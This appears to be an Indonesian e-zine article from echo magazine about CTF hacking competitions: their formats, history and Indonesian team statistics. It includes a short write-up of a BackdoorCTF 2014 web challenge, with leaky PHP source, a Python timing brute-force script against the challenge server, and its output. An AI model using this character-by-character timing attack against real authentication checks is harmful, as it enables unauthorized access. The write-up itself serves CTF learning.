@@ -1,0 +1,242 @@
+                      ____       (_)           _____ (_) _       ____ 
+                     (____)  ___ (_)__    ___ (_____) _ (_)__   (____)
+                    (_)_(_)_(___)(____)  (___)  _(_) (_)(____) (_)_(_)
+                    (__)__(_)___ (_) (_)(_)_(_)(_)__ (_)(_) (_)(__)__ 
+                     (____)(____)(_) (_) (___)(_____)(_)(_) (_) (____)  
+                  ECHO MAGAZINE VOLUME XII, ISSUE XXIX, PHILE 0x002.TXT                                       
+
+Pseudo-Random - The Game of Hacking - y3dips
+y3dips/at/echo/dot/or/dot/id
+
+-----| Pendahuluan
+             
+Pada pseudo-random kali ini saya hanya ingin membahas mengenai fenomena
+permainan hacking yang akhirnya akhir-akhir ini mulai marak di negara kita
+tercinta ini. Secara pribadi saya cukup bahagia dengan mulai adanya perhatian
+pemerintah, perusahaan dan juga institusi pendidikan untuk menyelengarakan 
+permainan-permainan hacking. 
+
+Terus terang "pseudo-random" kali ini bakal berbeda dengan sebelum2nya :).
+Harapan saya menulis ini adalah agar semakin lebih banyak lagi individu/tim
+dari Indonesia yang aktif bermain di CTF, khususnya dengan level internasional,
+dan pengalaman saya pribadi adalah saya akui bahwa saya sangat tertinggal jauh
+dalam hal ini :|.
+
+Meskipun CTF bukan hal baru bagi saya pribadi, untuk ctf offline dengan format
+attack defence sendiri saya dan the_day pernah mengikuti CTF offline pertama di
+negeri ini (CMIIW) pada salah satu konferensi hacking internasional "Bellua
+Cyber Security"[1] di 2005 dan Alhamdulillah kami menjadi pemenangnya. Sejak
+itulah kami pun membuat ctf untuk echo di tahun2 berikutnya [2], dan di 2008
+dengan adanya kegiatan IDSECCONF di tiap tahunnya juga rutin di adakan ctf
+offline dan online.
+
+-----| CTF
+
+Permainan hacking atau yang di kenal CTF, seingat saya sangat mengemuka secara
+online di sekitar tahun 2003 saat hackthissite.org[3] pertama kali mengeluarkan
+permainan dengan jumlah kurang lebih 15 level dan akhirnya mulai ramai di ikuti
+oleh beberapa web lain yang membuka permainan yang sama. Sedangkan secara
+offline dengan format "attack-defence" adalah konferensi hacker terbesar dan
+tertua di dunia DEFCON yang sudah sangat lama memulainya di 1996[4].
+
+Sejak tahun 2011, adalah web ctftime.org[5] yang telah mengambil alih manajemen
+dan pintu informasi mengenai berbagai permainan hacking yang tesebar di seluruh
+dunia. Bahkan para security professional dan hacker ikut terlibat untuk ikut ke
+dalam kelompok-kelompok yang berpartisipasi dalam tiap-tiap permainan CTF ini,
+sebut saja j00ru, gynvael dari dragon sector yang saat ini menduduki posisi
+pertama, kemudian ada blasty dari einbazen, red-dragon dari CLGT atau
+single-player seperti geohot (tomcr00se).
+
+Adapun format permainan hacking ini sebenarnya ada 3 jenis[6], yang pertama
+adalah "jeopardy" dimana permainan ini memiliki sejumlah tantangan dan berbagai
+sub-kategori sebagai contoh sub-kategori  web terdapat tantangan dengan level
+low, medium, hard atau berdasarkan poin. Sub kategori yang umumnya ada diantaranya: 
+crypto, web, forensic, reverse engineering, exploitation bahkan trivia. Dan umumnya
+permainan ini menentukan pemenang dengan jumlah poin yang tertinggi.
+
+Format yang kedua adalah "attack-defence", format jenis ini umumnya dilakukan
+secara "offline", tetapi sudah terdapat beberapa  game organizer yang
+menyelenggarakan permainan hacking dengan jenis ini secara online, peserta 
+diharuskan mengkonfigurasikan sistem (VM Image yang disiapkan panitia) yang  
+vulnerable di jaringan miliknya sendiri. Setiap tim harus melakukan patch dan 
+eksploitasi terhadap layanan-layanan yang bercelah di sistem (VM). Berdasarkan 
+sejarah, inilah jenis CTF yang pertama. 
+
+Format yang ketiga "mixed" atau merupakan kombinasi keduanya.
+
+-----| Statistics
+
+Meskipun cukup membanggakan saya, tetapi ternyata menurut statistik di
+ctftime.org, pada 2013 hanya terdapat 2 tim dari Indonesia yang aktif
+bermain di beragam ctf yang terdata di ctftime.org[7], yaitu: MEH dan rentjong.
+
+Position        Country Position           Name             Points 
+283              1                         rentjong         44.252
+1354             2                         MEH              5.202
+
+dan di 2014 bertambah menjadi 3 tim:
+
+Position        Country position           Name             Points
+544             1                          xnosuchteam      4.202
+569             2                          rentjong         3.973
+1356            3                          MEH              0.290
+
+Dan rata-rata tiap tim hanya diisi oleh 1 atau 2 pemain, walau terkadang lebih
+sering hanya di isi 1 orang.Bandingkan dengan tim-tim lain yang berisikan 5-20 
+anggota, maka hal ini akan sangat memudahkan dalam pengerjaan tugas, dimana 
+spesialisasi masing-masing individu akan lebih bermanfaat di tiap-tiap jenis 
+tantangan, sebagaimana seseorang yang ahli di web akan fokus menyelesaikan tantangan 
+pada web aplikasi dsb.
+
+-----| Jump To The Row
+
+Adapun hal yang saya soroti dan menjadi perhatian saya terkait kendala  adalah
+masalah kecepatan internet yang sangat memberikan kendala saat mengikuti
+permainan ini, khususnya pada format "attack-defence" dikarenakan banyaknya
+"agent/robot" dari penyelengara yang akan memeriksa layanan/tantangan itu umumnya
+memiliki "timeout" yang apabila timeout tersebut dilewati maka layanan akan di
+anggap mati dan tidak akan memberikan point apa-apa (khususnya defense point)
+
+Hal ini juga terjadi pada beberapa tantangan pada format jeopardy, khususnya
+pada ctf yang terakhir (rentjong[8]) saya ikuti sendirian di BackdoorCTF
+2014[9] (dikarenakan anggota tim rentjong lainnya sedang banyak urusan pribadi
+:p), adalah soal web-hacking dengan poin 200 (cukup besar) yang tantangannya
+masih di buat online oleh penyelengara di
+https://backdoor-web200.herokuapp.com/, adapun kode dari aplikasi adalah
+sebagai berikut ini:
+
++--------------------- https://backdoor-web200.herokuapp.com/source.php --
+| <?php
+| set_time_limit(0);
+| if(isset($_GET['key'])){
+|     $key = $_GET['key'];
+|     if(strlen($key)!=5)
+|         die("Key is of length 5, and alphanumeric (both upper and lower case).");
+|    for($i=0;$i<strlen($key);$i++)
+|    {
+|        $KEY=getenv('KEY');
+|        if($key[$i]!=$KEY[$i])
+|            die("Wrong key");
+|        usleep(200000);
+|    }
+|    echo getenv('FLAG');
+| }
+| else{
+|     echo <<<EOD
+| This time the FLAG is safe from a brute force attack. <a href="source.php">source</a>.
+| <form action="index.php">
+|    <input name="key" maxlength="5" size="5"><input type="submit">
+| </form>
+| EOD;
+| }
++----
+
+Sekilas saja kita sudah mengetahui dimana letak celah dari aplikasi ini, yaitu
+celah bruteforce login yang hanya terdiri dari 5 karakter password kombinasi
+dari huruf besar, huruf kecil serta angka, kemudian yang menjadi kunci
+adalah fungsi usleep() selama 2 detik apabila karakter sesuai, sehingga kita
+hanya perlu melakukan bruteforce per-karakter, dan yang memiliki delay >2 detik
+berkemungkinan besar merupakan karakter yang benar, dan delay akan
+"incremental" untuk karakter2 selanjutnya. 
+
+Dan disinilah masalahnya, koneksi internet negara kita yang umumnya 
+"tidak terlalu cepat" (baca:super lambat) membuat sangat mustahil untuk mendapatkan 
+perhitungan waktu yang tepat, dan exploit yang saya buat pun akhirnya tidak berjalan 
+sempurna :(
+
+Dan dikarenakan sangat "frustasi"-nya saya, maka saya catat waktu yang
+dibutuhkan untuk satu-persatu karakter secara manual dan mengesampingkan script
+auto yang sudah di buat dan tidak berjalan yang sebenarnya hanya me-looping
+setiap karakter dengan karakter yang tepat adalah dengan waktu delay > 2detik.
+
++--------- 1 karakter ---
+| import  requests
+| import time
+| 
+| satus='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
+| dua='zzzz'
+| 
+| for n in range(0,61):
+|    satu = (satus[n]+dua)
+|    print "[*] Trying Bruteforce with: %s" %satu
+|    t1 = time.time()
+|    resp=requests.get('http://backdoor.cognizance.org.in/problems/web200/submit.php?key=%s' %satu)
+|    if resp.text != 'Wrong key':
+|        print resp.text
+|    t2= time.time()
+|    print resp.text, (t2-t1)
++-----------------
+
+dan setelah di tulis ke file (wow ditulis ke file? so noob? me?) didapatkan hasil kurang 
+lebih sebagai berikut:
+
++----- truncated ----
+| [*] Trying Bruteforce with: Azzzz
+| Wrong key 0.107516050339
+| [*] Trying Bruteforce with: Bzzzz
+| Wrong key 0.0865318775177
+| [*] Trying Bruteforce with: Czzzz
+| Wrong key 0.0899112224579
+| [*] Trying Bruteforce with: Dzzzz
+| Wrong key 0.0869650840759
+| [*] Trying Bruteforce with: Ezzzz
+| Wrong key 0.0873830318451
+| [*] Trying Bruteforce with: Fzzzz
+| Wrong key 0.0901799201965
+| [*] Trying Bruteforce with: Gzzzz
+| Wrong key 0.0873301029205
+| [*] Trying Bruteforce with: Hzzzz
+| Wrong key 0.0842640399933
+| [*] Trying Bruteforce with: Izzzz
+| Wrong key 0.0857269763947
+| [*] Trying Bruteforce with: Jzzzz
+| Wrong key 0.0904648303986
+| [*] Trying Bruteforce with: Kzzzz
+| Wrong key 0.0865280628204
+| [*] Trying Bruteforce with: Lzzzz
+| Wrong key 0.0878829956055
+| [*] Trying Bruteforce with: Mzzzz
+| Wrong key 0.0884602069855
+| [*] Trying Bruteforce with: Nzzzz
+| Wrong key 0.107254981995
+| [*] Trying Bruteforce with: Ozzzz
+| Wrong key 0.0904181003571
+| [*] Trying Bruteforce with: Pzzzz
+| Wrong key 0.086375951767
++--------------
+
+Lihat betapa frustasinya saya? :roflmao:, tetapi hal ini belum se-frustasi saat
+mengikuti ctf dengan format attack-defence saat semua service dinyatakan mati
+oleh scoringserver :()
+
+Hal lain yang menjadi kendala adalah perbedaan waktu, umumnya permainan ini
+dilaksanakan diwaktu seharusnya kita di bagian negeri ini tertidur lelap dan
+juga umumnya dilakukan pada hari libur :), hal ini yang umumnya membuat kami 
+yang sudah bekerja dan berkeluarga terkadang harus melewatkan banyak waktu 
+menyenangkan dari permainan ini dan memilih untuk tidur atau menghabiskannya
+bersama keluarga :)
+
+-----| FIN.
+
+Pada akhirnya ini semua hanyalah permainan, yang meskipun dibuat semakin
+mirip dengan berbagai kasus yang ditemukan di dunia nyata tetapi tetap tidaklah 
+sama :).
+
+Untuk saya pribadi, permainan-permainan ini sangat menghibur dan membuka wawasan
+saya khususnya pada bagian-bagian yang saya tidak terlalu menguasainya, dan
+bahkan membuat saya terkejut dengan betapa unik dan menariknya tantangan yang
+disajikan.
+
+Jadi, tunggu apa lagi? mari kita ramaikan dan kibarkan nama tim-tim dari Indonesia.
+
+-----| Referensi
+
+[1] http://seclists.org/isn/2005/Jan/45
+[2] "Echo CTF teaser 2014" http://ctf.echo.or.id/readme.txt
+[3] https://www.hackthissite.org/missions/
+[4] "DEfCON ctf history" https://www.defcon.org/html/links/dc-ctf-history.html
+[5] "CTF Time" https://ctftime.org/
+[6] "CTF? WTF?" https://ctftime.org/ctf-wtf/
+[7] https://ctftime.org/stats/2014/ID
+[8] "Indonesian CTF Team - Rentjong" http://rentjong-team.blogspot.com/
+[9] "Backdoor CTF 2014" https://ctftime.org/event/141
